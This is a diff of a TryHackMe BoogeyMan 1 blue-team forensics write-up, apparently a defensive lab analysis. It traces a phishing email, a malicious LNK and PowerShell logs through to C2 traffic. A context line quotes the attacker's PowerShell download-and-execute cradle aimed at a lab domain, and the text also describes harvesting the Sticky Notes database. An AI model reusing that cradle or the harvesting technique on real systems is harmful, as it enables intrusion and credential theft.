@@ -1,6 +1,6 @@
 # BoogeyMan 1 | Blue Team / DFIR Investigation 
 
-**Category:** SOC Level 1 Capstone — Phishing & Endpoint/Network Forensics
+**Category:** SOC Level 1 Capstone , Phishing & Endpoint/Network Forensics
 **Platform:** TryHackMe
 **Difficulty:** Medium
 **Skills Demonstrated:** Email Header Analysis, Phishing Triage, LNK File Forensics, Base64/PowerShell Payload Decoding, Windows PowerShell Event Log Analysis, Network Traffic Analysis (Wireshark/Tshark), C2 Traffic Identification, CyberChef Decoding
@@ -17,9 +17,9 @@
 The attacker sent a phishing email with a password-protected `Invoice.zip` attachment containing a malicious `.lnk` (Windows shortcut) file. Executing the `.lnk` triggered an obfuscated PowerShell one-liner that downloaded and ran a second-stage payload, leading to host enumeration, access to sensitive local application data, and outbound C2/exfiltration traffic disguised as normal HTTP.
 
 This investigation reconstructs the full attack chain using three provided artefacts:
-- `dump.eml` — the phishing email
-- `powershell.json` — PowerShell ScriptBlock logs (converted from `.evtx` via `evtx2json`)
-- `capture.pcapng` — a network packet capture from the victim's workstation
+- `dump.eml` , the phishing email
+- `powershell.json` , PowerShell ScriptBlock logs (converted from `.evtx` via `evtx2json`)
+- `capture.pcapng` , a network packet capture from the victim's workstation
 
 ---
 
@@ -38,12 +38,12 @@ This investigation reconstructs the full attack chain using three provided artef
 
 ## 3. Step-by-Step Walkthrough
 
-### Task 2 — Email Analysis ("Look at that headers!")
+### Task 2 , Email Analysis ("Look at that headers!")
 
 **Steps:**
 1. Opened `dump.eml` in Thunderbird to inspect the sender, recipient, and body content.
 2. Extracted the full raw headers via **View → Message Source** and ran them through a message header analyzer to trace the delivery path.
-3. Identified and extracted the malicious `Invoice.zip` attachment, noted its password (included in the email body as a "helpful" instruction — a common social-engineering technique to bypass attachment scanning), and extracted its contents.
+3. Identified and extracted the malicious `Invoice.zip` attachment, noted its password (included in the email body as a "helpful" instruction , a common social-engineering technique to bypass attachment scanning), and extracted its contents.
 4. Ran **LNKParse3** against the extracted `.lnk` file to reveal its embedded PowerShell command line.
 
 **Findings:**
@@ -63,11 +63,11 @@ iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/updat
 
 This is a classic **download-cradle** pattern: the LNK invokes PowerShell, which fetches a second-stage script from the attacker's file-hosting domain and executes it entirely in memory via `Invoke-Expression` (`iex`), leaving minimal disk artefacts.
 
-**Note on the impersonated domain:** The attacker registered `bpakcaging.xyz` — a **typosquat** of the real partner domain `bpackaging.xyz`/similar (missing the "c" in "packaging") — a common technique to make phishing infrastructure appear legitimate at a glance.
+**Note on the impersonated domain:** The attacker registered `bpakcaging.xyz` , a **typosquat** of the real partner domain `bpackaging.xyz`/similar (missing the "c" in "packaging") , a common technique to make phishing infrastructure appear legitimate at a glance.
 
 ---
 
-### Task 3 — Endpoint Security ("Are you sure that's an invoice?")
+### Task 3 , Endpoint Security ("Are you sure that's an invoice?")
 
 **Steps:**
 1. Parsed the PowerShell ScriptBlock logs (`powershell.json`) using `jq`, sorting entries chronologically to reconstruct the execution timeline:
@@ -83,11 +83,11 @@ This is a classic **download-cradle** pattern: the LNK invokes PowerShell, which
 | Enumeration tool downloaded by the attacker | **Seatbelt** (a well-known open-source Windows host/security-posture enumeration tool) |
 | File accessed via the downloaded `sq3.exe` binary | `C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite` |
 
-**Analysis:** `sq3.exe` is a portable SQLite client binary. The attacker used it to directly query the **Sticky Notes** application's local SQLite database (`plum.sqlite`) — a well-documented technique for harvesting sensitive information (passwords, personal notes, internal references) that users often carelessly store in note-taking apps.
+**Analysis:** `sq3.exe` is a portable SQLite client binary. The attacker used it to directly query the **Sticky Notes** application's local SQLite database (`plum.sqlite`) , a well-documented technique for harvesting sensitive information (passwords, personal notes, internal references) that users often carelessly store in note-taking apps.
 
 ---
 
-### Task 4 — Network Traffic Analysis ("They got us. Call the bank immediately!")
+### Task 4 , Network Traffic Analysis ("They got us. Call the bank immediately!")
 
 **Steps:**
 1. Opened `capture.pcapng` in Wireshark and filtered for HTTP traffic to the identified file-hosting domain (`files.bpakcaging.xyz`).
@@ -98,11 +98,11 @@ This is a classic **download-cradle** pattern: the LNK invokes PowerShell, which
 **Findings:**
 | Question | Answer |
 |---|---|
-| Software hosting the attacker's file/payload server | **Python** (i.e., Python's built-in `http.server` module — a lightweight, quickly-deployable web server frequently used by attackers for staging payloads) |
+| Software hosting the attacker's file/payload server | **Python** (i.e., Python's built-in `http.server` module , a lightweight, quickly-deployable web server frequently used by attackers for staging payloads) |
 | HTTP method used by the C2 to receive command output | **POST** |
 | Password of the exfiltrated file | `%p9³!lL^Mz47E2GaT^y` |
 
-**Analysis:** The use of Python's built-in HTTP server is a strong indicator of a fast, low-effort C2/staging setup rather than a purpose-built C2 framework — consistent with a financially motivated actor targeting a narrow vertical (logistics) rather than a highly resourced APT.
+**Analysis:** The use of Python's built-in HTTP server is a strong indicator of a fast, low-effort C2/staging setup rather than a purpose-built C2 framework , consistent with a financially motivated actor targeting a narrow vertical (logistics) rather than a highly resourced APT.
 
 ---
 
@@ -154,7 +154,7 @@ Password-protected exfil archive recovered from PCAP + decoded via CyberChef
 
 ## 6. OWASP Applicability
 
-This investigation is a **Blue Team / Digital Forensics & Incident Response (DFIR)** exercise involving phishing, endpoint compromise, and network-based C2 — not a web application security assessment. As such, the **OWASP Top 10** is **not applicable** to this room's scope and has intentionally been omitted from this report. The **MITRE ATT&CK Framework** (Section 5) is the more appropriate and industry-standard reference for classifying this type of adversary behavior.
+This investigation is a **Blue Team / Digital Forensics & Incident Response (DFIR)** exercise involving phishing, endpoint compromise, and network-based C2 , not a web application security assessment. As such, the **OWASP Top 10** is **not applicable** to this room's scope and has intentionally been omitted from this report. The **MITRE ATT&CK Framework** (Section 5) is the more appropriate and industry-standard reference for classifying this type of adversary behavior.
 
 ---
 
@@ -179,9 +179,9 @@ This investigation is a **Blue Team / Digital Forensics & Incident Response (DFI
 
 ## 8. Key Takeaways
 
-- **Password-protected attachments are a red flag, not a legitimacy signal.** Attackers routinely use them specifically to defeat automated email-gateway scanning — analysts and end users should treat "here's the password" phishing emails with heightened suspicion.
+- **Password-protected attachments are a red flag, not a legitimacy signal.** Attackers routinely use them specifically to defeat automated email-gateway scanning , analysts and end users should treat "here's the password" phishing emails with heightened suspicion.
 - **`.lnk` files are a persistent and effective initial-access vector** because they appear as harmless shortcuts but can embed full command lines, including obfuscated PowerShell.
-- **Base64-encoded PowerShell (`-EncodedCommand`) is UTF-16LE, not UTF-8** — analysts decoding such payloads must account for this encoding or risk misinterpreting the recovered script.
+- **Base64-encoded PowerShell (`-EncodedCommand`) is UTF-16LE, not UTF-8** , analysts decoding such payloads must account for this encoding or risk misinterpreting the recovered script.
 - **Legitimate local application databases (e.g., Sticky Notes) can be a goldmine for attackers**, since users often store sensitive information (passwords, personal notes) in tools not designed for secure storage.
 - **PowerShell ScriptBlock Logging** (as reconstructed from `powershell.json`) is an invaluable, high-fidelity forensic source for reconstructing fileless attack chains that leave few traditional disk-based artefacts.
 - **Domain typosquatting** (e.g., `bpakcaging.xyz` vs. the legitimate partner domain) remains one of the simplest and most effective techniques for making phishing infrastructure appear trustworthy at a glance.
@@ -190,7 +190,7 @@ This investigation is a **Blue Team / Digital Forensics & Incident Response (DFI
 
 ## 9. References
 
-- TryHackMe — *BoogeyMan* room (SOC Level 1 Capstone Challenge).
-- MITRE ATT&CK® Framework — [attack.mitre.org](https://attack.mitre.org)
-- Seatbelt (GhostPack) — [github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
-- CyberChef — [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/)
+- TryHackMe , *BoogeyMan* room (SOC Level 1 Capstone Challenge).
+- MITRE ATT&CK® Framework , [attack.mitre.org](https://attack.mitre.org)
+- Seatbelt (GhostPack) , [github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
+- CyberChef , [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/)
